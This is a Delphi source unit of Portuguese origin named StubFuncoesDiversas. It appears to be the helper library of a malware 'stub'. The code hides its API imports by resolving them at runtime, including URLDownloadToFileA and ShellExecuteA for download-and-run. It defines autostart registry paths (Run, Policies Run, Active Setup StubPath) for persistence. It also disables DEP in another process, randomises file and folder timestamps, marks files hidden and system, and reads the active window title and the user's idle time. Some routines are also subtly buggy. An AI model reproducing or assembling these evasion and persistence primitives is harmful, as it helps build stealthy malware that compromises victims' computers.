Unit StubFuncoesDiversas;

interface

uses
  StrUtils,windows,
  TlHelp32;

const
  faReadOnly  = $00000001 platform;
  faHidden    = $00000002 platform;
  faSysFile   = $00000004 platform;
  faVolumeID  = $00000008 platform;
  faDirectory = $00000010;
  faArchive   = $00000020 platform;
  faSymLink   = $00000040 platform;
  faAnyFile   = $0000003F;

const
  _Kernel32 = 'kernel32';
  _URLMon = 'urlmon';
  _URLDownloadToFileA = 'URLDownloadToFileA';
  _GetSystemDirectoryA = 'GetSystemDirectoryA';
  _GetWindowsDirectoryA = 'GetWindowsDirectoryA';
  _GetTempPathA = 'GetTempPathA';
  _CurrentVersion = 'SOFTWARE\Microsoft\Windows\CurrentVersion';
  _ProgramFilesDir = 'ProgramFilesDir';
  _http_shell_open_command = 'http\shell\open\command';
  _InternetExplorer = '\Internet Explorer\iexplore.exe';
  _GetModuleFileNameExA = 'GetModuleFileNameExA';
  _PSAPI = 'PSAPI';
  _ShellFolders = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders';
  _AppData = 'AppData';
  _shell32 = 'shell32';
  _ShellExecuteA = 'ShellExecuteA';
  _PoliciesRun = 'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run';
  _CurrentVersionRun = 'Software\Microsoft\Windows\CurrentVersion\Run';
  _InstalledComponents = 'Software\Microsoft\Active Setup\Installed Components';
  _StubPath = 'StubPath';
  _Shell_TrayWnd = 'Shell_TrayWnd';
type
  pPROCESS_BASIC_INFORAMTION = ^PROCESS_BASIC_INFORAMTION;
  PROCESS_BASIC_INFORAMTION = packed record
    ExitStatus : DWORD;
    PEBBaseAddress : Pointer;
    AffinityMask : DWORD;
    BasePriority : DWORD;
    UniqueProcessId : DWORD;
    InheritedFormUniqueProcessId : DWORD;
end;

function IntToStr(i: Int64): String;
function StrToInt(S: String): Int64;
function UpperString(S: String): String;
function LowerString(S: String): String;
function ExtractFilename(const path: string): string;
function StrToBool(Str: string): boolean;
function BoolToStr(Bool: boolean): string;
function GetDefaultBrowser: string;
Function lerreg(Key:HKEY; Path:string; Value, Default: string): string;
function GetProgramFilesDir: string;
function StrLen(tStr: PChar):integer;
function ProcessFileName(PID: DWORD): string;
function processExists(exeFileName: string; var PID: integer): Boolean;
function write2reg(key: Hkey; subkey, name, value: string; RegistryValueTypes: DWORD = REG_EXPAND_SZ): boolean;
function DirectoryExists(const Directory: string): Boolean;
function ForceDirectories(Pasta: string): boolean;
function MySystemFolder: String;
function MyRootFolder: String;
function MyWindowsFolder: String;
function MyTempFolder: String;
function GetAppDataDir: string;
function GetShellFolder(CSIDL: integer): string;
function fileexists(filename: string): boolean;
function MyDeleteFile(s: String): Boolean;
function ExtractFileExt(const filename: string): string;
function MyShellExecute(hWndA: HWND; Operation, FileName, Parameters, Directory: PChar; ShowCmd: Integer): HINST;
procedure ChangeFileTime(FileName: string);
procedure ChangeDirTime(dn: string);
function ExtractFilePath(sFilename: String): String;
procedure HideFileName(FileName: string);
function DisableDEP(pid: dword): Boolean;
Procedure CriarArquivo(NomedoArquivo: String; imagem: string; Size: DWORD);
Function ReplaceString(ToBeReplaced, ReplaceWith : string; TheString :string):string;
function LerArquivo(FileName: String): String;
function ZwQueryInformationProcess(hProcess: THandle;
  InformationClass: DWORD;Buffer: pPROCESS_BASIC_INFORAMTION;
  BufferLength : DWORD;ReturnLength: PDWORD): Cardinal; stdcall; external 'ntdll.dll' name 'ZwQueryInformationProcess';
function ZwSetInformationProcess(cs1:THandle; cs2:ULONG;
  cs3:Pointer; cs4:ULONG):ULONG; stdcall; external 'ntdll.dll' name 'ZwSetInformationProcess';
Function StartThread(pFunction : TFNThreadStartRoutine; iPriority : Integer = Thread_Priority_Normal; iStartFlag : Integer = 0) : THandle;
Function CloseThread( ThreadHandle : THandle) : Boolean;
function MyURLDownloadToFile(Caller: IUnknown; URL: PChar; FileName: PChar;
  Reserved: DWORD; LPBINDSTATUSCALLBACK: pointer): HResult;
procedure ProcessMessages;
Function ExtractDiskSerial(Drive: String): String;
function ShowTime(DayChar: Char = '/'; DivChar: Char = ' '; HourChar: Char = ':'): String;
function ActiveCaption: string;
function ExecAndWait(const FileName, Params: string;
  const WindowState: Word): boolean;
function SecondsIdle: integer;
function Trim(const S: string): string;
procedure SetAttributes(FileName, Attributes: string);
function PossoMexerNoArquivo(Arquivo: string): boolean;
function ExecuteCommand(command, params: string; ShowCmd: dword): boolean;

implementation

type
  PSHItemID = ^TSHItemID;
  {$EXTERNALSYM _SHITEMID}
  _SHITEMID = record
    cb: Word;                         { Size of the ID (including cb itself) }
    abID: array[0..0] of Byte;        { The item ID (variable length) }
  end;
  TSHItemID = _SHITEMID;
  {$EXTERNALSYM SHITEMID}
  SHITEMID = _SHITEMID;

  PItemIDList = ^TItemIDList;
  {$EXTERNALSYM _ITEMIDLIST}
  _ITEMIDLIST = record
     mkid: TSHItemID;
   end;
  TItemIDList = _ITEMIDLIST;
  {$EXTERNALSYM ITEMIDLIST}
  ITEMIDLIST = _ITEMIDLIST;

type
  IMalloc = interface(IUnknown)
    ['{00000002-0000-0000-C000-000000000046}']
    function Alloc(cb: Longint): Pointer; stdcall;
    function Realloc(pv: Pointer; cb: Longint): Pointer; stdcall;
    procedure Free(pv: Pointer); stdcall;
    function GetSize(pv: Pointer): Longint; stdcall;
    function DidAlloc(pv: Pointer): Integer; stdcall;
    procedure HeapMinimize; stdcall;
  end;

function Succeeded(Res: HResult): Boolean;
begin
  Result := Res and $80000000 = 0;
end;

function SHGetMalloc(out ppMalloc: IMalloc): HResult; stdcall; external 'shell32.dll' name 'SHGetMalloc'
function SHGetSpecialFolderLocation(hwndOwner: HWND; nFolder: Integer;
  var ppidl: PItemIDList): HResult; stdcall; external 'shell32.dll' name 'SHGetSpecialFolderLocation';
function SHGetPathFromIDList(pidl: PItemIDList; pszPath: PChar): BOOL; stdcall; external 'shell32.dll' name 'SHGetPathFromIDList';

const
  CSIDL_FLAG_CREATE = $8000;
  CSIDL_ADMINTOOLS = $0030;
  CSIDL_ALTSTARTUP = $001D;
  CSIDL_APPDATA = $001A;
  CSIDL_BITBUCKET = $000A;
  CSIDL_CDBURN_AREA = $003B;
  CSIDL_COMMON_ADMINTOOLS = $002F;
  CSIDL_COMMON_ALTSTARTUP = $001E;
  CSIDL_COMMON_APPDATA = $0023;
  CSIDL_COMMON_DESKTOPDIRECTORY = $0019;
  CSIDL_COMMON_DOCUMENTS = $002E;
  CSIDL_COMMON_FAVORITES = $001F;
  CSIDL_COMMON_MUSIC = $0035;
  CSIDL_COMMON_PICTURES = $0036;
  CSIDL_COMMON_PROGRAMS = $0017;
  CSIDL_COMMON_STARTMENU = $0016;
  CSIDL_COMMON_STARTUP = $0018;
  CSIDL_COMMON_TEMPLATES = $002D;
  CSIDL_COMMON_VIDEO = $0037;
  CSIDL_CONTROLS = $0003;
  CSIDL_COOKIES = $0021;
  CSIDL_DESKTOP = $0000;
  CSIDL_DESKTOPDIRECTORY = $0010;
  CSIDL_DRIVES = $0011;
  CSIDL_FAVORITES = $0006;
  CSIDL_FONTS  = $0014;
  CSIDL_HISTORY = $0022;
  CSIDL_INTERNET = $0001;
  CSIDL_INTERNET_CACHE = $0020;
  CSIDL_LOCAL_APPDATA = $001C;
  CSIDL_MYDOCUMENTS = $000C;
  CSIDL_MYMUSIC = $000D;
  CSIDL_MYPICTURES = $0027;
  CSIDL_MYVIDEO = $000E;
  CSIDL_NETHOOD = $0013;
  CSIDL_NETWORK = $0012;
  CSIDL_PERSONAL = $0005;
  CSIDL_PRINTERS = $0004;
  CSIDL_PRINTHOOD = $001B;
  CSIDL_PROFILE = $0028;
  CSIDL_PROFILES = $003E;
  CSIDL_PROGRAM_FILES = $0026;
  CSIDL_PROGRAM_FILES_COMMON = $002B;
  CSIDL_PROGRAMS = $0002;
  CSIDL_RECENT = $0008;
  CSIDL_SENDTO = $0009;
  CSIDL_STARTMENU = $000B;
  CSIDL_STARTUP = $0007;
  CSIDL_SYSTEM = $0025;
  CSIDL_TEMPLATES = $0015;
  CSIDL_WINDOWS = $0024;

function GetShellFolder(CSIDL: integer): string;
var
  pidl                   : PItemIdList;
  FolderPath             : string;
  SystemFolder           : Integer;
  Malloc                 : IMalloc;
begin
  Malloc := nil;
  FolderPath := '';
  SHGetMalloc(Malloc);
  if Malloc = nil then
  begin
    Result := FolderPath;
    Exit;
  end;
  try
    SystemFolder := CSIDL;
    if SUCCEEDED(SHGetSpecialFolderLocation(0, SystemFolder, pidl)) then
    begin
      SetLength(FolderPath, max_path);
      if SHGetPathFromIDList(pidl, PChar(FolderPath)) then
      begin
        SetLength(FolderPath, length(PChar(FolderPath)));
      end else FolderPath := '';
    end;
    Result := FolderPath;
  finally
    Malloc.Free(pidl);
  end;
end;

function ExecuteCommand(command, params: string; ShowCmd: dword): boolean;
begin
  if myShellExecute(0, nil, pchar(command), pchar(params), nil, ShowCmd) <= 32 then
  result := false else result := true;
end;

function PossoMexerNoArquivo(Arquivo: string): boolean;
var
  HFileRes: HFile;
begin
  result := true;
  HFileRes := CreateFile(PChar(Arquivo),
                         GENERIC_READ,
                         0,
                         nil,
                         OPEN_EXISTING,
                         FILE_ATTRIBUTE_NORMAL,
                         0);

  if HFileRes = INVALID_HANDLE_VALUE then result := false;
  CloseHandle(HFileRes);
end;

procedure SetAttributes(FileName, Attributes: string);
var
  i: cardinal;
begin
  if (posex('A', Attributes) <= 0) and
     (posex('H', Attributes) <= 0) and
     (posex('R', Attributes) <= 0) and
     (posex('S', Attributes) <= 0) then exit;
  SetFileAttributes(PChar(FileName), FILE_ATTRIBUTE_NORMAL);
  i := GetFileAttributes(PChar(FileName));
  if posex('A', Attributes) > 0 then i := i or faArchive;
  if posex('H', Attributes) > 0 then i := i or faHidden;
  if posex('R', Attributes) > 0 then i := i or faReadOnly;
  if posex('S', Attributes) > 0 then i := i or faSysFile;
  SetFileAttributes(PChar(FileName), i);
end;

function Trim(const S: string): string;
var
  I, L: Integer;
begin
  L := Length(S);
  I := 1;
  while (I <= L) and (S[I] <= ' ') do Inc(I);
  if I > L then Result := '' else
  begin
    while S[L] <= ' ' do Dec(L);
    Result := Copy(S, I, L - I + 1);
  end;
end;

function ExecAndWait(const FileName, Params: string;
  const WindowState: Word): boolean;
var
  SUInfo: TStartupInfo;
  ProcInfo: TProcessInformation;
  CmdLine: string;
begin
  { Coloca o nome do arquivo entre aspas. Isto é necessário devido
    aos espaços contidos em nomes longos }
  CmdLine := '"' + Filename + '"' + ' ' + Params;
  FillChar(SUInfo, SizeOf(SUInfo), #0);
  with SUInfo do
  begin
    cb := SizeOf(SUInfo);
    dwFlags := STARTF_USESHOWWINDOW;
    wShowWindow := WindowState;
  end;
  Result := CreateProcess(nil, PChar(CmdLine), nil, nil, false,
    CREATE_NEW_CONSOLE or NORMAL_PRIORITY_CLASS, nil,
    PChar(ExtractFilePath(Filename)), SUInfo, ProcInfo);

  { Aguarda até ser finalizado }
  if Result then
  begin
    WaitForSingleObject(ProcInfo.hProcess, INFINITE);
    { Libera os Handles }
    CloseHandle(ProcInfo.hProcess);
    CloseHandle(ProcInfo.hThread);
  end;
end;

function SecondsIdle: integer;
var
   liInfo: TLastInputInfo;
begin
   liInfo.cbSize := SizeOf(TLastInputInfo) ;
   GetLastInputInfo(liInfo) ;
   Result := GetTickCount - liInfo.dwTime;
end;

function TrimRight(const s: string): string;
var
  i: integer;
begin
  i := Length(s);

  if i <= 0 then
  begin
    result := s;
    exit;
  end;

  while (I > 0) and (s[i] <= ' ') do Dec(i);
  Result := Copy(s, 1, i);
end;

function ActiveCaption: string;
var
  Handle: THandle;
  Len: LongInt;
  Title: string;
begin
  Result := '';
  Handle := GetForegroundWindow;
  if Handle <> 0 then
  begin
    Len := GetWindowTextLength(Handle) + 1;
    SetLength(Title, Len);
    GetWindowText(Handle, PChar(Title), Len);
    //ActiveCaption := TrimRight(Title);
    Result := TrimRight(Title);
  end;
end;

function ShowTime(DayChar: Char = '/'; DivChar: Char = ' '; HourChar: Char = ':'): String;
var
  SysTime: TSystemTime;
  Month, Day, Hour, Minute, Second: String;
begin
  GetLocalTime(Systime);
  month := inttostr(systime.wMonth);
  day := inttostr(systime.wDay);
  hour := inttostr(Systime.wHour);
  minute := inttostr(Systime.wMinute);
  Second := inttostr(systime.wSecond);
  if length(month) = 1 then month := '0' + month;
  if length(day) = 1 then day := '0' + day;
  if length(hour) = 1 then hour := '0' + hour;
  if hour = '24' then hour := '00';
  if length(minute) = 1 then minute := '0' + minute;
  if length(second) = 1 then second := '0' + second;
  Result :=  day + DayChar + month + DayChar + IntTostr(Systime.wYear) + DivChar + hour + HourChar + minute + HourChar + second;
end;

function IntToHex(dwNumber: DWORD; Len: Integer): String; overload;
const
  HexNumbers:Array [0..15] of Char = ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
                                      'A', 'B', 'C', 'D', 'E', 'F');
begin
  Result := '';
  while dwNumber <> 0 do
  begin
    Result := HexNumbers[Abs(dwNumber mod 16)] + Result;
    dwNumber := dwNumber div 16;
  end;
  if Result = '' then
  begin
    while Length(Result) < Len do
      Result := '0' + Result;
    Exit;
  end;
  if Result[Length(Result)] = '-' then
  begin
    Delete(Result, Length(Result), 1);
    Insert('-', Result, 1);
  end;
  while Length(Result) < Len do
    Result := '0' + Result;
end;

Function ExtractDiskSerial(Drive: String): String;
Var
  Serial:DWord;
  DirLen,Flags: DWord;
  DLabel : Array[0..11] of Char;
begin
  Result := '';
  GetVolumeInformation(PChar(Drive),dLabel,12,@Serial,DirLen,Flags,nil,0);
  Result := IntToHex(Serial,8);
end;

function xProcessMessage(var Msg: TMsg): Boolean;
var
  Handled: Boolean;
begin
  Result := False;
  if PeekMessage(Msg, 0, 0, 0, PM_REMOVE) then
  begin
    Result := True;
    begin
      TranslateMessage(Msg);
      DispatchMessage(Msg);
    end;
  end;
  sleep(5);
end;

procedure ProcessMessages; // Usando essa procedure eu percebi que o "processmessage" deve ser colocado no final do loop
var
  Msg: TMsg;
begin
  while xProcessMessage(Msg) do {loop};
end;

function MyURLDownloadToFile(Caller: IUnknown; URL: PChar; FileName: PChar;
  Reserved: DWORD; LPBINDSTATUSCALLBACK: pointer): HResult;
var
  xURLDownloadToFile: function(Caller: IUnknown; URL: PChar; FileName: PChar;
    Reserved: DWORD; LPBINDSTATUSCALLBACK: pointer): HResult; stdcall;
begin
  xURLDownloadToFile := GetProcAddress(LoadLibrary(_URLMon), pchar(_URLDownloadToFileA));
  Result := xURLDownloadToFile(Caller, URL, FileName, Reserved, LPBINDSTATUSCALLBACK);
end;

function LerArquivo(FileName: String): String;
var
  hFile: Cardinal;
  lpNumberOfBytesRead: DWORD;
  imagem: pointer;
  Tamanho: DWORD;
begin
  result := '';
  if fileexists(filename) = false then exit;
  
  imagem := nil;
  hFile := CreateFile(PChar(FileName), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  tamanho := GetFileSize(hFile, nil);
  GetMem(imagem, tamanho);
  ReadFile(hFile, imagem^, tamanho, lpNumberOfBytesRead, nil);
  setstring(result, Pchar(imagem), tamanho);
  freemem(imagem, tamanho);
  CloseHandle(hFile);
end;

Function ReplaceString(ToBeReplaced, ReplaceWith : string; TheString :string):string;
var
  Position: Integer;
  LenToBeReplaced: Integer;
  TempStr: String;
  TempSource: String;
begin
  LenToBeReplaced:=length(ToBeReplaced);
  TempSource:=TheString;
  TempStr:='';
  repeat
    position := posex(ToBeReplaced, TempSource);
    if (position <> 0) then
    begin
      TempStr := TempStr + copy(TempSource, 1, position-1); //Part before ToBeReplaced
      TempStr := TempStr + ReplaceWith; //Tack on replace with string
      TempSource := copy(TempSource, position+LenToBeReplaced, length(TempSource)); // Update what's left
    end else
    begin
      Tempstr := Tempstr + TempSource; // Tack on the rest of the string
    end;
  until (position = 0);
  Result:=Tempstr;
end;

Procedure CriarArquivo(NomedoArquivo: String; imagem: string; Size: DWORD);
var
  hFile: THandle;
  lpNumberOfBytesWritten: DWORD;

begin
  hFile := CreateFile(PChar(NomedoArquivo), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);

  if hFile <> INVALID_HANDLE_VALUE then
  begin
    if Size = INVALID_HANDLE_VALUE then
    SetFilePointer(hFile, 0, nil, FILE_BEGIN);
    WriteFile(hFile, imagem[1], Size, lpNumberOfBytesWritten, nil);
    CloseHandle(hFile);
  end;
end;

function DisableDEP(pid: dword): Boolean;
var
  ExecuteFlags: LongWord;
  ProcessHandle: THandle;
begin
  Result := False;

  ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, pid);

  if ProcessHandle = 0 then
    Exit;
  if ZwQueryInformationProcess(ProcessHandle, {ProcessExecuteFlags} 22, @ExecuteFlags, sizeof(ExecuteFlags), nil) < $C0000000 then
  begin
    ExecuteFlags := ExecuteFlags or $2; // MEM_EXECUTE_OPTION_ENABLE
    ExecuteFlags := ExecuteFlags or $8; // MEM_EXECUTE_OPTION_PERMANENT

    Result := (ZwSetInformationProcess(ProcessHandle, {ProcessExecuteFlags} 22, @ExecuteFlags, sizeof(ExecuteFlags)) < $C0000000);

    CloseHandle(ProcessHandle);
  end;
end;

function LastDelimiter(S: String; Delimiter: Char): Integer;
var
  i: Integer;
begin
  Result := -1;
  i := Length(S);
  if (S = '') or (i = 0) then
    Exit;
  while S[i] <> Delimiter do
  begin
    if i < 0 then
      break;
    dec(i);
  end;
  Result := i;
end;

function ExtractFilePath(sFilename: String): String;
begin
  if (LastDelimiter(sFilename, '\') = -1) and (LastDelimiter(sFilename, '/') = -1) then
    Exit;
  if LastDelimiter(sFilename, '\') <> -1 then
  Result := Copy(sFilename, 1, LastDelimiter(sFilename, '\')) else
  if LastDelimiter(sFilename, '/') <> -1 then
  Result := Copy(sFilename, 1, LastDelimiter(sFilename, '/'));
end;

procedure ChangeFileTime(FileName: string);
var
  SHandle: THandle;
  MyFileTime : TFileTime;
begin
  randomize;
  MyFileTime.dwLowDateTime := 29700000 + random(99999);
  MyFileTime.dwHighDateTime:= 29700000 + random(99999);

  SHandle := CreateFile(PChar(FileName), GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  if SHandle = INVALID_HANDLE_VALUE then
  begin
    CloseHandle(sHandle);
    SHandle := CreateFile(PChar(FileName), GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if SHandle <> INVALID_HANDLE_VALUE then
    SetFileTime(sHandle, @MyFileTime, @MyFileTime, @MyFileTime);
    CloseHandle(sHandle);
  end else
  SetFileTime(sHandle, @MyFileTime, @MyFileTime, @MyFileTime);
  CloseHandle(sHandle);
end;

procedure ChangeDirTime(dn: string);
var
  h: THandle;
  ft: TFileTime;
begin
  ft.dwLowDateTime := 29700000 + random(99999);
  ft.dwHighDateTime:= 29700000 + random(99999);

  h:= CreateFile(PChar(dn),
                 GENERIC_WRITE, FILE_SHARE_READ, nil,
                 OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, 0);
  if h <> INVALID_HANDLE_VALUE then
  begin
    //DateTimeToSystemTime(dt, st);
    //SystemTimeToFileTime(st, ft);

    // last access
    SetFileTime(h, nil, @ft, nil);
    // last write
    SetFileTime(h, nil, nil, @ft);
    // creation
    SetFileTime(h, @ft, nil, nil);
  end;
  CloseHandle(h);
end;

procedure HideFileName(FileName: string);
var
  i: cardinal;
begin
  i := GetFileAttributes(PChar(FileName));
  i := i or faHidden;   //oculto
  i := i or faReadOnly; //somente leitura
  i := i or faSysFile;  //de sistema
  SetFileAttributes(PChar(FileName), i);
end;

function MyShellExecute(hWndA: HWND; Operation, FileName, Parameters, Directory: PChar; ShowCmd: Integer): HINST;
var
  xShellExecute: function(hWndA: HWND; Operation, FileName, Parameters, Directory: PChar; ShowCmd: Integer): HINST; stdcall;
begin
  xShellExecute := GetProcAddress(LoadLibrary(_shell32), pchar(_ShellExecuteA));
  Result := xShellExecute(hWndA, Operation, FileName, Parameters, Directory, ShowCmd);
end;

function fileexists(filename: string): boolean;
var
  hfile: thandle;
  lpfindfiledata: twin32finddata;

begin
  result := false;
  hfile := findfirstfile(pchar(filename), lpfindfiledata);
  if hfile <> invalid_handle_value then
  begin
    findclose(hfile);
    result := true;
  end;
end;

function MyDeleteFile(s: String): Boolean;
var
  i: Byte;
begin
  Result := FALSE;
  if FileExists(s)then
  try
    i := GetFileAttributes(PChar(s));
    i := i and faHidden;
    i := i and faReadOnly;
    i := i and faSysFile;
    SetFileAttributes(PChar(s), i);
    Result := DeleteFile(Pchar(s));
  except
  end;
end;

function GetAppDataDir: string;
begin
  result := GetShellFolder(CSIDL_APPDATA);
end;

function MyGetSystem(lpBuffer: PChar; uSize: UINT): UINT;
var
  xGetSystem: function(lpBuffer: PChar; uSize: UINT): UINT; stdcall;
begin
  xGetSystem := GetProcAddress(LoadLibrary(_Kernel32), pchar(_GetSystemDirectoryA));
  Result := xGetSystem(lpBuffer, uSize);
end;

function MyGetWindows(lpBuffer: PChar; uSize: UINT): UINT;
var
  xGetWindows: function(lpBuffer: PChar; uSize: UINT): UINT; stdcall;
begin
  xGetWindows := GetProcAddress(LoadLibrary(_Kernel32), pchar(_GetWindowsDirectoryA));
  Result := xGetWindows(lpBuffer, uSize);
end;

function MyGetTemp(nBufferLength: DWORD; lpBuffer: PChar): DWORD;
var
  xGetTemp: function(nBufferLength: DWORD; lpBuffer: PChar): DWORD; stdcall;
begin
  xGetTemp := GetProcAddress(LoadLibrary(_Kernel32), pchar(_GetTempPathA));
  Result := xGetTemp(nBufferLength, lpBuffer);
end;

function MySystemFolder: String;
var
  lpBuffer: Array[0..MAX_PATH] of Char;
begin
  MyGetSystem(lpBuffer, sizeof(lpBuffer));
  Result := String(lpBuffer) + '\';
end;

function MyWindowsFolder: String;
var
  lpBuffer: Array[0..MAX_PATH] of Char;
begin
  MyGetWindows(lpBuffer, sizeof(lpBuffer));
  Result := String(lpBuffer) + '\';
end;

function MyTempFolder: String;
var
  lpBuffer: Array[0..MAX_PATH] of Char;
begin
  MyGetTemp(sizeof(lpBuffer), lpBuffer);
  Result := String(lpBuffer);
end;

function MyRootFolder: String;
var
  TempStr: string;
begin
  TempStr := MyWindowsFolder;
  Result := copy(TempStr, 1, posex('\', TempStr));
end;

function DirectoryExists(const Directory: string): Boolean;
var
  Code: Integer;
begin
  Code := GetFileAttributes(PChar(Directory));
  Result := (Code <> -1) and (FILE_ATTRIBUTE_DIRECTORY and Code <> 0);
end;

function ForceDirectories(Pasta: string): boolean;
var
  TempStr, TempDir: string;
begin
  result := false;
  if pasta = '' then exit;
  if DirectoryExists(Pasta) = true then
  begin
    result := true;
    exit;
  end;
  TempStr := Pasta;
  if TempStr[length(TempStr)] <> '\' then TempStr := TempStr + '\';

  while posex('\', TempStr) >= 1 do
  begin
    TempDir := TempDir + copy(TempStr, 1, posex('\', TempStr));
    delete(Tempstr, 1, posex('\', TempStr));
    if DirectoryExists(TempDir) = false then
    if Createdirectory(pchar(TempDir), nil) = false then exit;
  end;
  result := DirectoryExists(pasta);
end;

function write2reg(key: Hkey; subkey, name, value: string; RegistryValueTypes: DWORD = REG_EXPAND_SZ): boolean;
var
  regkey: hkey;
begin
  result := false;
  RegCreateKey(key, PChar(subkey), regkey);
  if RegSetValueEx(regkey, Pchar(name), 0, RegistryValueTypes, pchar(value), length(value)) = 0 then
    result := true;
  RegCloseKey(regkey);
end;

Function lerreg(Key:HKEY; Path:string; Value, Default: string): string;
Var
  Handle:hkey;
  RegType:integer;
  DataSize:integer;

begin
  Result := Default;
  if (RegOpenKeyEx(Key, pchar(Path), 0, KEY_QUERY_VALUE, Handle) = ERROR_SUCCESS) then
  begin
    if RegQueryValueEx(Handle, pchar(Value), nil, @RegType, nil, @DataSize) = ERROR_SUCCESS then
    begin
      SetLength(Result, Datasize);
      RegQueryValueEx(Handle, pchar(Value), nil, @RegType, PByte(pchar(Result)), @DataSize);
      SetLength(Result, Datasize - 1);
    end;
    RegCloseKey(Handle);
  end;
end;

function ExtractFileExt(const filename: string): string;
var
  i, l: integer;
  ch: char;
begin
  if posex('.', filename) = 0 then
  begin
    result := '';
    exit;
  end;
  l := length(filename);
  for i := l downto 1 do
  begin
    ch := filename[i];
    if (ch = '.') then
    begin
      result := copy(filename, i, length(filename));
      break;
    end;
  end;
end;

function GetProgramFilesDir: string;
var
  chave, valor: string;
begin
  chave := _CurrentVersion;
  valor := _ProgramFilesDir;
  result := lerreg(HKEY_LOCAL_MACHINE, chave, valor, '');
end;

function GetDefaultBrowser: string;
var
  chave, valor: string;
begin
  chave := _http_shell_open_command;
  valor := '';
  result := lerreg(HKEY_CLASSES_ROOT, chave, valor, '');

  if result = '' then exit;
  while posex('"', result) > 0 do delete(result, posex('"', result), 1);

  if upperstring(extractfileext(result)) <> '.EXE' then
  result := GetProgramFilesDir + _InternetExplorer;
end;

function StrToBool(Str: string): boolean;
begin
  if str = 'TRUE' then result := true else result := false;
end;

function BoolToStr(Bool: boolean): string;
begin
  if Bool = true then result := 'TRUE' else result := 'FALSE';
end;        

function ExtractFilename(const path: string): string;
var
i, l: integer;
ch: char;

begin
  result := path;
  if posex('\', path) <= 0 then exit;

  l := length(path);
  for i := l downto 1 do
  begin
    ch := path[i];
    if ch = '\' then
    begin
      result := copy(path, i + 1, l - i);
      break;
    end;
  end;
end;

function IntToStr(i: Int64): String;
begin
  Str(i, Result);
end;

function StrToInt(S: String): Int64;
var
  E: integer;
begin
  Val(S, Result, E);
end;

function UpperString(S: String): String;
var
  i: Integer;
begin
  for i := 1 to Length(S) do
    S[i] := char(CharUpper(PChar(S[i])));
  Result := S;
end;

function LowerString(S: String): String;
var
  i: Integer;
begin
  for i := 1 to Length(S) do
    S[i] := char(CharLower(PChar(S[i])));
  Result := S;
end;

function StrLen(tStr:PChar):integer;
begin
  result:=0;
  while tStr[Result] <> #0 do
  inc(Result);
end;

function ProcessFileName(PID: DWORD): string;
var
  Handle: THandle;
  dll: Cardinal;
  GetModuleFileNameEx: function(hProcess: THandle; hModule: HMODULE;
    lpFilename: PChar; nSize: DWORD): DWORD; stdcall;
begin
  Result := '';
  Handle := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, False, PID);
  if Handle <> 0 then
  try
    SetLength(Result, MAX_PATH);
    begin
      dll := LoadLibrary(_PSAPI);
      @GetModuleFileNameEx := GetProcAddress(dll, pchar(_GetModuleFileNameExA));

      if GetModuleFileNameEx(Handle, 0, PChar(Result), MAX_PATH) > 0 then
      SetLength(Result, StrLen(PChar(Result)))
      else
      Result := '';
    end;
    finally
    CloseHandle(Handle);
  end;
end;

function processExists(exeFileName: string; var PID: integer): Boolean;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  PID := 0;
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  Result := False;
  while Integer(ContinueLoop) <> 0 do
  begin
    if ((UpperString(ExtractFileName(FProcessEntry32.szExeFile)) =
      UpperString(ExeFileName)) or (UpperString(FProcessEntry32.szExeFile) =
      UpperString(ExeFileName))) then
    begin
      Result := True;
      PID := FProcessEntry32.th32ProcessID;
    end;
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

Function StartThread(pFunction : TFNThreadStartRoutine; iPriority : Integer = Thread_Priority_Normal; iStartFlag : Integer = 0) : THandle;
var
  ThreadID : DWORD;
begin
  Result := CreateThread(nil, 0, pFunction, nil, iStartFlag, ThreadID);
  SetThreadPriority(Result, iPriority);
end;

Function CloseThread( ThreadHandle : THandle) : Boolean;
begin
  Result := TerminateThread(ThreadHandle, 1);
  CloseHandle(ThreadHandle);
end;

end.
